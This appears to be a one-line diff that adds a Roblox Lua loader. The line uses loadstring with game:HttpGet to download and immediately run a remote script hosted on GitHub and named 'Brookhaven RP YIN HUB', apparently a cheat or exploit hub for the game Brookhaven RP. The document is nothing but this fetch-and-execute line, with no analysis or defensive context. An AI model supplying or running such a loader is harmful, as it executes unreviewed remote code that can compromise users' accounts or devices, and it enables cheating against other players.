@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cjsarmientocjsarmiento832/idk/main/Brookhaven%20RP%20YIN%20HUB"))()
